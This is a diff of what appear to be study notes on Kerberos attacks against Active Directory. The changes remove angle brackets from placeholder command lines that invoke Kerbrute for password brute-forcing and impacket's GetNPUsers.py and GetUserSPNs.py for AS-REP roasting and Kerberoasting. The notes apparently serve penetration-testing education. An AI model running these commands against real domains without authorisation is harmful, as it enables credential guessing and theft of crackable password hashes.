@@ -78,7 +78,7 @@ In this attack basically we do bruteforce attack against the kerberos protocol, 
 
 Tool : Kerbrute
 
-Command: python kerbrute.py -domain <domain_name> -users <users_file> -passwords <password_file> -dc-ip <ip_of_the_DC>
+Command: python kerbrute.py -domain <domain_name> -users users_file -passwords password_file -dc-ip ip_of_the_DC
 
 
 2.AS_REPRoast:
@@ -87,7 +87,7 @@ In the first step of authentication, we have seen that after doing the pre-authe
 
 Tool: impacket-GetNPUsers.py
 
-Command: python GetNPUsers.py <domain_name>/ -dc-ip <ip+of_the_DC> -usersfile <usernames> -format hashcat -outputfile <filename>
+Command: python GetNPUsers.py domain_name/ -dc-ip ip_of_the_DC -usersfile usernames -format hashcat -outputfile filename
 
 
 3.Kerberoasting:
@@ -96,7 +96,7 @@ In step four , we have seen that the client will request for the TGS in order to
 
 Tool: Imapacket-GetUserSPNs.py
 
-Command:python GetUserSPNs.py <domain_name>/<user_name>:<password> -outputfile <file_name>
+Command:python GetUserSPNs.py domain_name/user_name:password -outputfile file_name
 
 There are two more attacks against kerberos , Golden Ticket attack and Silver Ticket attack, will talk in more detail later.
 
